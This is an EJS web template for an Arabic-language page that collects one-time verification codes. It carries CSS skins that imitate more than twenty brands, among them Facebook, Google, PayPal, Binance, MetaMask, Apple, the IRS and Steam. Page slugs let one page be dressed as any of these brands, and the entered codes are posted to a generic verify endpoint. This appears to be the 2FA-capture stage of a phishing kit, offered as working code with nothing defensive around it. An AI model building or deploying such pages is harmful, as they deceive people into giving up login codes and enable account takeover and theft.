<!doctype html>
<html lang="ar" dir="rtl">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><%= pageContent.headline %> — <%= tpl.name %></title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&display=swap" rel="stylesheet">
<style>
  :root { --bg:<%= tpl.palette.bg %>; --card:<%= tpl.palette.card %>; --fg:<%= tpl.palette.fg %>; --accent:<%= tpl.palette.accent %>; --accent2:<%= tpl.palette.accent2 %>; }
  * { box-sizing:border-box; margin:0; padding:0; }
  body { font-family:'Cairo',system-ui; background:var(--bg); color:var(--fg); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:24px; }
  .auth { background:var(--card); border-radius:20px; padding:36px 28px; width:100%; max-width:440px; }
  .logo { width:56px; height:56px; border-radius:16px; background:linear-gradient(135deg,var(--accent),var(--accent2)); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:800; font-size:1.6rem; margin:0 auto 24px; }
  .logo-svg { display:block; margin:0 auto 24px; }
  h1 { font-size:1.3rem; text-align:center; margin-bottom:6px; font-weight:800; }
  .sub { text-align:center; font-size:.9rem; opacity:.75; margin-bottom:22px; }
  .otp-wrap { display:flex; gap:8px; justify-content:center; margin:22px 0; }
  .otp-wrap input { width:52px; height:60px; text-align:center; font-size:1.6rem; font-weight:800; border:2px solid rgba(255,255,255,.12); border-radius:12px; background:rgba(0,0,0,.2); color:var(--fg); font-family:inherit; }
  .otp-wrap input:focus { outline:none; border-color:var(--accent); }
  button { padding:15px; border:0; border-radius:12px; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; font-size:1.05rem; font-weight:800; cursor:pointer; font-family:inherit; width:100%; }
  button:disabled { opacity:.5; cursor:not-allowed; }
  .timer { color:var(--accent); font-weight:700; }

  body.brand-facebook { background:#f0f2f5; color:#1c1e21; }
  body.brand-facebook .auth { background:#fff; border:none; box-shadow:0 2px 4px rgba(0,0,0,.1); border-radius:8px; }
  body.brand-facebook .otp-wrap input { background:#fff; border:1px solid #dddfe2; color:#1c1e21; }
  body.brand-facebook button { background:#1877F2; background-image:none; border-radius:6px; }
  body.brand-google, body.brand-gmail { background:#fff; color:#202124; }
  body.brand-google .auth, body.brand-gmail .auth { background:#fff; border:1px solid #dadce0; box-shadow:none; border-radius:8px; }
  body.brand-google .otp-wrap input, body.brand-gmail .otp-wrap input { background:#fff; border:1px solid #dadce0; color:#202124; }
  body.brand-google button, body.brand-gmail button { background:#1a73e8; background-image:none; border-radius:4px; }
  body.brand-binance { background:#181A20; color:#eaecef; }
  body.brand-binance .auth { background:#1e2026; border:1px solid #2e3340; border-radius:8px; }
  body.brand-binance .otp-wrap input { background:#2b2f36; border:1px solid #474d57; color:#eaecef; }
  body.brand-binance button { background:#F0B90B; color:#1a1a1a; background-image:none; border-radius:4px; }
  body.brand-metamask { background:#24272A; }
  body.brand-metamask .auth { background:#1c1f22; border:1px solid #3c4044; }
  body.brand-metamask button { background:#F6851B; background-image:none; border-radius:8px; }
  body.brand-paypal { background:#0070ba; }
  body.brand-paypal .auth { background:#fff; color:#2c2e2f; border-radius:6px; }
  body.brand-paypal button { background:#0070ba; background-image:none; border-radius:25px; }
  body.brand-discord { background:#5865F2; }
  body.brand-discord .auth { background:#36393f; border-radius:5px; }
  body.brand-discord .otp-wrap input { background:#40444b; border:none; color:#dcddde; }
  body.brand-discord button { background:#5865F2; background-image:none; border-radius:3px; }

  body.brand-apple { background:#f5f5f7; color:#1d1d1f; }
  body.brand-apple .auth { background:#fff; border-radius:18px; box-shadow:0 4px 16px rgba(0,0,0,.12); }
  body.brand-apple .otp-wrap input { background:#f5f5f7; border:1px solid #d2d2d7; color:#1d1d1f; }
  body.brand-apple button { background:#0071e3; background-image:none; border-radius:980px; }
  body.brand-microsoft { background:#fff; color:#323130; }
  body.brand-microsoft .auth { background:#fff; border-radius:0; box-shadow:none; }
  body.brand-microsoft .otp-wrap input { background:#fff; border:1px solid #605e5c; color:#323130; }
  body.brand-microsoft button { background:#0067b8; background-image:none; border-radius:2px; }
  body.brand-amazon { background:#fff; color:#0f1111; }
  body.brand-amazon .auth { background:#fff; border:1px solid #a6a6a6; border-radius:4px; box-shadow:none; }
  body.brand-amazon .otp-wrap input { background:#fff; border:1px solid #a6a6a6; color:#0f1111; }
  body.brand-amazon button { background:linear-gradient(to bottom,#f7dfa5,#f0c14b); color:#111; border:1px solid #a88734; background-image:none; }
  body.brand-netflix { background:#000; color:#fff; }
  body.brand-netflix .auth { background:#141414; border-radius:4px; }
  body.brand-netflix .otp-wrap input { background:#333; border:none; color:#fff; }
  body.brand-netflix button { background:#e50914; background-image:none; border-radius:4px; }
  body.brand-instagram { background:#fafafa; color:#262626; }
  body.brand-instagram .auth { background:#fff; border:1px solid #dbdbdb; border-radius:1px; box-shadow:none; }
  body.brand-instagram .otp-wrap input { background:#fafafa; border:1px solid #dbdbdb; color:#262626; }
  body.brand-instagram button { background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); background-image:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); border-radius:4px; }
  body.brand-twitter, body.brand-twitterx { background:#fff; color:#0f1419; }
  body.brand-twitter .auth, body.brand-twitterx .auth { background:#fff; border-radius:16px; box-shadow:none; }
  body.brand-twitter .otp-wrap input, body.brand-twitterx .otp-wrap input { background:#fff; border:1px solid #cfd9de; color:#0f1419; }
  body.brand-twitter button, body.brand-twitterx button { background:#0f1419; background-image:none; border-radius:9999px; }
  body.brand-coinbase { background:#fff; color:#0a0b0d; }
  body.brand-coinbase .auth { background:#fff; border:1px solid #e9eaeb; border-radius:16px; }
  body.brand-coinbase .otp-wrap input { background:#f5f5f5; border:1px solid #e9eaeb; color:#0a0b0d; }
  body.brand-coinbase button { background:#0052FF; background-image:none; border-radius:8px; }
  body.brand-linkedin { background:#f3f2ef; color:#000; }
  body.brand-linkedin .auth { background:#fff; border-radius:8px; box-shadow:0 0 0 1px rgba(0,0,0,.15); }
  body.brand-linkedin .otp-wrap input { background:#fff; border:1px solid rgba(0,0,0,.4); color:#000; }
  body.brand-linkedin button { background:#0a66c2; background-image:none; border-radius:28px; }
  body.brand-snapchat { background:#FFFC00; color:#000; }
  body.brand-snapchat .auth { background:#fff; border-radius:32px; box-shadow:0 4px 20px rgba(0,0,0,.15); }
  body.brand-snapchat .otp-wrap input { background:#f5f5f5; border:1.5px solid #e0e0e0; color:#000; }
  body.brand-snapchat button { background:#FFFC00; color:#000; background-image:none; border-radius:100px; }
  body.brand-tiktok { background:#000; color:#fff; }
  body.brand-tiktok .auth { background:#161823; border:1px solid #2e3340; border-radius:0; }
  body.brand-tiktok .otp-wrap input { background:#2b2f36; border:1px solid #3c4044; color:#fff; }
  body.brand-tiktok button { background:#fe2c55; background-image:none; border-radius:2px; }
  body.brand-spotify { background:#191414; color:#fff; }
  body.brand-spotify .auth { background:#191414; }
  body.brand-spotify .otp-wrap input { background:#3e3e3e; border:none; color:#fff; }
  body.brand-spotify button { background:#1DB954; color:#000; background-image:none; border-radius:50px; }
  body.brand-irs { background:#f5f5f5; color:#1a1a1a; font-family:'Times New Roman',serif; }
  body.brand-irs .auth { background:#fff; border:1px solid #ccc; border-radius:4px; }
  body.brand-irs .otp-wrap input { background:#fff; border:1px solid #aaa; color:#1a1a1a; }
  body.brand-irs button { background:#003366; background-image:none; border-radius:3px; }
  body.brand-emirates { background:#C8102E; color:#fff; }
  body.brand-emirates .auth { background:#fff; color:#1a1a1a; border-radius:6px; }
  body.brand-emirates .otp-wrap input { background:#f7f7f7; border:1px solid #ddd; color:#1a1a1a; }
  body.brand-emirates button { background:#C8102E; background-image:none; border-radius:4px; }
  body.brand-qatarairways { background:#5C0632; color:#fff; }
  body.brand-qatarairways .auth { background:#fff; color:#1a1a1a; border-radius:6px; }
  body.brand-qatarairways .otp-wrap input { background:#f7f7f7; border:1px solid #ddd; color:#1a1a1a; }
  body.brand-qatarairways button { background:#5C0632; background-image:none; border-radius:4px; }
  body.brand-steam { background:#1b2838; color:#c6d4df; }
  body.brand-steam .auth { background:#1e2b38; border-radius:3px; }
  body.brand-steam .otp-wrap input { background:#316282; border:none; color:#fff; }
  body.brand-steam button { background:linear-gradient(to bottom,#a4d007,#536904); color:#fff; background-image:none; border-radius:3px; }
</style>
</head>
<body class="brand-<%= tpl.key || tpl.name.toLowerCase().replace(/[^a-z0-9]/g,'') %>">
<div class="auth">
  <% if (typeof logos !== 'undefined' && logos[tpl.key]) { %>
    <div class="logo-svg"><%- logos[tpl.key] %></div>
  <% } else { %>
    <div class="logo"><%= tpl.name.charAt(0) %></div>
  <% } %>
  <h1><%= pageContent.headline %></h1>
  <p class="sub"><%= pageContent.subheadline %></p>

  <% if (typeof error !== 'undefined' && error) { %>
    <div style="background:#ef444420;border:1px solid #ef444440;border-radius:9px;padding:10px 14px;font-size:.85rem;color:#fca5a5;margin-bottom:14px;text-align:center"><%= error %></div>
  <% } %>

  <form method="POST" action="/p/<%= page.slug %>/verify" id="otpForm">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="hidden" name="_step" value="<%= pageContent.slug || 'verify' %>">
    <div class="otp-wrap" id="otpWrap">
      <% for (let i = 0; i < (pageContent.otp_length || 6); i++) { %>
        <input type="text" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
      <% } %>
    </div>
    <input type="hidden" name="code" id="codeHidden">
    <button type="submit" id="submitBtn" disabled><%= pageContent.cta || 'تأكيد' %></button>
  </form>

  <div style="text-align:center;font-size:.83rem;margin-top:16px;opacity:.75">
    الكود صالح <span class="timer" id="timer">05:00</span>
  </div>
  <div style="text-align:center;margin-top:14px">
    <button type="button" id="resendBtn" style="background:transparent;border:1px solid rgba(255,255,255,.2);color:var(--fg);font-size:.85rem;padding:8px 20px;width:auto;opacity:.7" onclick="resendOTP()">إعادة إرسال الكود</button>
  </div>
</div>

<script>
  const inputs = document.querySelectorAll('#otpWrap input');
  const hidden = document.getElementById('codeHidden');
  const submitBtn = document.getElementById('submitBtn');
  const len = inputs.length;

  function sync() {
    const code = Array.from(inputs).map(i => i.value).join('');
    hidden.value = code;
    submitBtn.disabled = code.length !== len;
  }

  inputs.forEach((inp, i) => {
    inp.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g,'');
      if (e.target.value && i < len - 1) inputs[i+1].focus();
      sync();
    });
    inp.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !e.target.value && i > 0) inputs[i-1].focus();
    });
  });

  let t = 300;
  const timerEl = document.getElementById('timer');
  const iv = setInterval(() => {
    t--;
    if (t <= 0) { timerEl.textContent = 'انتهى'; clearInterval(iv); return; }
    timerEl.textContent = `${String(Math.floor(t/60)).padStart(2,'0')}:${String(t%60).padStart(2,'0')}`;
  }, 1000);

  if (inputs[0]) inputs[0].focus();

  // Paste support
  document.addEventListener('paste', e => {
    const txt = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g,'');
    if (!txt) return;
    inputs.forEach((inp, i) => { inp.value = txt[i] || ''; });
    sync();
    const last = Math.min(txt.length, len) - 1;
    if (inputs[last]) inputs[last].focus();
  });

  async function resendOTP() {
    const btn = document.getElementById('resendBtn');
    btn.disabled = true; btn.textContent = 'جاري...';
    try {
      const r = await fetch('/p/<%= page.slug %>/resend-otp', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({_csrf:'<%= csrfToken %>'}) });
      const d = await r.json();
      btn.textContent = d.message || 'تم الإرسال';
      t = 300;
    } catch { btn.textContent = 'خطأ'; }
    setTimeout(() => { btn.disabled = false; btn.textContent = 'إعادة إرسال الكود'; }, 30000);
  }
</script>
</body>
</html>
